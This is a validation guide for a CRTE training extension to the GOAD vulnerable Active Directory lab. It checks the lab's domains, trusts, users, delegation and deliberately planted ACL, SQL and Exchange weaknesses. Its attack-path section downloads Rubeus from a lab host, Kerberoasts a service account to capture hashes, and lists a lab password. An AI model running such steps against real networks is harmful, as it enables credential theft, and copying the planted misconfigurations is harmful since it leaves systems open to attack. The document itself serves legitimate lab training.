# CRTE Extension for GOAD - Validation Guide

This guide provides instructions for validating that the CRTE extension has been properly installed and configured on your GOAD environment.

## Validation Script

The CRTE extension includes a validation script that automatically checks the configuration of all components:

```powershell
# Run the validation script
.\validate.ps1
```

The validation script checks:
1. Domain creation and accessibility
2. Trust relationships
3. User and group creation
4. Vulnerability configurations
5. Service configurations

## Manual Validation Steps

If you prefer to validate the installation manually, follow these steps:

### 1. Validate Domain Structure

Verify that all required domains have been created:

```powershell
# Check domain trusts from the main domain controller
Enter-PSSession -ComputerName 192.168.56.10 -Credential (Get-Credential)
nltest /domain_trusts
Exit-PSSession

# Check child domain
Enter-PSSession -ComputerName 192.168.56.11 -Credential (Get-Credential)
nltest /domain_trusts
Exit-PSSession

# Check additional forests
Enter-PSSession -ComputerName 192.168.56.20 -Credential (Get-Credential)
nltest /domain_trusts
Exit-PSSession
```

Expected output should show trusts between:
- kingandqueen.local and north.kingandqueen.local (parent-child)
- kingandqueen.local and bastion.local (one-way)
- bastion.local and production.local (one-way)
- north.kingandqueen.local and db.local (selective authentication)
- db.local and dbvendor.local (two-way)
- north.kingandqueen.local and usvendor.local (one-way)

### 2. Validate User Accounts

Verify that the required user accounts have been created:

```powershell
# Check users in kingandqueen.local
Enter-PSSession -ComputerName 192.168.56.10 -Credential (Get-Credential)
Get-ADUser -Filter * | Where-Object {$_.SamAccountName -like "crte*" -or $_.SamAccountName -like "svc_*"}
Exit-PSSession

# Check users in north.kingandqueen.local
Enter-PSSession -ComputerName 192.168.56.11 -Credential (Get-Credential)
Get-ADUser -Filter * | Where-Object {$_.SamAccountName -like "regular_*" -or $_.SamAccountName -like "helpdesk_*" -or $_.SamAccountName -like "svc_*" -or $_.SamAccountName -like "user_*"}
Exit-PSSession
```

### 3. Validate Kerberos Delegation

Verify that Kerberos delegation is properly configured:

```powershell
# Check unconstrained delegation
Enter-PSSession -ComputerName 192.168.56.11 -Credential (Get-Credential)
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Check constrained delegation
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
Exit-PSSession
```

### 4. Validate ACL Misconfigurations

Verify that ACL misconfigurations are properly configured:

```powershell
# Check GenericAll permission on Domain Admins
Enter-PSSession -ComputerName 192.168.56.11 -Credential (Get-Credential)
Import-Module ActiveDirectory
$group = Get-ADGroup "Domain Admins"
(Get-Acl -Path "AD:$($group.DistinguishedName)").Access | Where-Object {$_.IdentityReference -like "*helpdesk_admin*"}
Exit-PSSession
```

### 5. Validate SQL Server Links

Verify that SQL Server links are properly configured:

```powershell
# Check SQL Server links
Enter-PSSession -ComputerName 192.168.56.23 -Credential (Get-Credential)
Invoke-Sqlcmd -Query "SELECT name FROM sys.servers WHERE is_linked = 1" -ServerInstance "localhost"
Exit-PSSession
```

### 6. Validate Azure AD Connect

Verify that Azure AD Connect is properly configured:

```powershell
# Check Azure AD Connect configuration
Enter-PSSession -ComputerName 192.168.56.28 -Credential (Get-Credential)
Test-Path "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Azure AD Connect" -Name "Install Path" -ErrorAction SilentlyContinue
Exit-PSSession
```

### 7. Validate Exchange Server

Verify that Exchange Server is properly configured:

```powershell
# Check Exchange Server configuration
Enter-PSSession -ComputerName 192.168.56.22 -Credential (Get-Credential)
Test-Path "C:\Program Files\Microsoft\Exchange Server\V15\VulnerablePermissions.txt"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\ExchangeServer\v15" -Name "InstallPath" -ErrorAction SilentlyContinue
Exit-PSSession
```

## Testing Attack Paths

To fully validate the CRTE extension, you should test the attack paths described in the attack paths documentation:

1. Log in to the student machine using the provided credentials
2. Attempt to execute the attack paths using the provided tools
3. Verify that each attack path works as expected

### Initial Testing

Start with a simple attack path to verify basic functionality:

```powershell
# Log in to the student machine
# Use these credentials:
# Username: regular_user
# Password: Password123!
# Domain: north.kingandqueen.local

# Test Kerberoasting
# Download and run Rubeus
Invoke-WebRequest -Uri "http://192.168.56.100/Rubeus.exe" -OutFile "Rubeus.exe"
.\Rubeus.exe kerberoast /user:svc_sql /domain:kingandqueen.local /outfile:hashes.txt

# Verify that a hash was captured
Get-Content .\hashes.txt
```

If the initial test is successful, proceed to test other attack paths as described in the attack paths documentation.

## Troubleshooting

If validation fails, check the following:

### Domain Issues

If domains are not properly created or accessible:
- Verify that the domain controllers are running
- Check DNS configuration
- Review the domain creation logs in the `domains` directory

### Trust Issues

If trust relationships are not properly configured:
- Verify that DNS resolution works between domains
- Check the trust configuration logs in the `domains` directory
- Try recreating the trusts manually using the `setup_trusts.ps1` script

### User Account Issues

If user accounts are not properly created:
- Check the user creation logs in the `users` directory
- Try recreating the users manually using the `create_users.ps1` script

### Vulnerability Configuration Issues

If vulnerabilities are not properly configured:
- Check the vulnerability configuration logs in the `vulnerabilities` directory
- Try reconfiguring the vulnerabilities manually using the specific vulnerability scripts

## Next Steps

Once validation is complete and all components are working as expected, you can:

1. Begin practicing the CRTE attack scenarios
2. Customize the environment to add additional attack paths
3. Extend the environment with your own scenarios

For detailed information on the available attack paths and scenarios, refer to the attack path documentation.
